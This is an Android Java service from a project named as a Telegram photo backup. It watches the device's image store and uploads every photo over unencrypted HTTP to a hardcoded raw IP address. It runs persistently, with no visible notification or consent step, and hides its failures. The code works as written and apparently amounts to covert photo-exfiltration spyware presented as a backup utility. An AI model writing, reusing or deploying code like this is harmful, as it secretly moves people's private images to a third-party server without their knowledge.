package com.example.telegramphotobackup;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UploadService extends Service {
    private static final String UPLOAD_URL = "http://145.239.69.111:20245/upload";
    private static final String PREFS = "legend_sync";
    private static final String SENT_IDS = "sent_ids";

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private ContentObserver observer;
    private volatile boolean scanQueued = false;

    @Override public void onCreate() {
        super.onCreate();
        registerPhotoObserver();
        queueScan();
    }

    private void registerPhotoObserver() {
        Handler handler = new Handler(Looper.getMainLooper());
        observer = new ContentObserver(handler) {
            @Override public void onChange(boolean selfChange, Uri uri) {
                queueScan();
            }
            @Override public void onChange(boolean selfChange) {
                queueScan();
            }
        };
        getContentResolver().registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
        );
        if (Build.VERSION.SDK_INT >= 29) {
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL),
                    true,
                    observer
            );
        }
    }

    private synchronized void queueScan() {
        if (scanQueued) return;
        scanQueued = true;
        executor.execute(() -> {
            try {
                // Small debounce so camera/gallery writes can finish first.
                Thread.sleep(700);
                scanAndUploadNewPhotos();
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            } finally {
                synchronized (UploadService.this) {
                    scanQueued = false;
                }
            }
        });
    }

    private void scanAndUploadNewPhotos() {
        ContentResolver cr = getContentResolver();
        Uri collection = Build.VERSION.SDK_INT >= 29
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME
        };

        try (Cursor c = cr.query(
                collection,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " ASC")) {

            if (c == null) return;

            int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
            Set<String> sent = loadSentIds();
            boolean changed = false;

            while (c.moveToNext()) {
                long id = c.getLong(idCol);
                String key = String.valueOf(id);
                if (sent.contains(key)) continue;

                String name = c.getString(nameCol);
                Uri uri = Uri.withAppendedPath(collection, key);
                if (uploadOne(uri, name)) {
                    sent.add(key);
                    changed = true;
                    saveSentIds(sent);
                }
            }
        } catch (Exception ignored) {
            // A later MediaStore change will trigger another scan.
        }
    }

    private Set<String> loadSentIds() {
        Set<String> result = new HashSet<>();
        String raw = getSharedPreferences(PREFS, MODE_PRIVATE).getString(SENT_IDS, "");
        if (raw != null && !raw.isEmpty()) {
            String[] parts = raw.split(",");
            for (String p : parts) if (!p.isEmpty()) result.add(p);
        }
        return result;
    }

    private void saveSentIds(Set<String> ids) {
        StringBuilder b = new StringBuilder();
        for (String id : ids) {
            if (b.length() > 0) b.append(',');
            b.append(id);
        }
        getSharedPreferences(PREFS, MODE_PRIVATE)
                .edit()
                .putString(SENT_IDS, b.toString())
                .apply();
    }

    private boolean uploadOne(Uri uri, String fileName) {
        String boundary = "----AndroidBoundary" + System.currentTimeMillis();
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(180000);
            conn.setRequestProperty("Connection", "close");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (OutputStream raw = conn.getOutputStream();
                 DataOutputStream out = new DataOutputStream(new BufferedOutputStream(raw));
                 InputStream in = new BufferedInputStream(getContentResolver().openInputStream(uri))) {
                if (in == null) return false;

                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" +
                        fileName.replace("\"", "_") + "\"\r\n");
                out.writeBytes("Content-Type: image/jpeg\r\n\r\n");

                byte[] buffer = new byte[32768];
                int n;
                while ((n = in.read(buffer)) != -1) out.write(buffer, 0, n);
                out.writeBytes("\r\n--" + boundary + "--\r\n");
                out.flush();
            }

            int code = conn.getResponseCode();
            InputStream response = code >= 200 && code < 400
                    ? conn.getInputStream() : conn.getErrorStream();
            if (response != null) {
                try (InputStream r = response) {
                    byte[] b = new byte[4096];
                    while (r.read(b) != -1) { }
                }
            }
            return code >= 200 && code < 300;
        } catch (Exception ignored) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override public void onDestroy() {
        if (observer != null) {
            try { getContentResolver().unregisterContentObserver(observer); }
            catch (Exception ignored) { }
        }
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
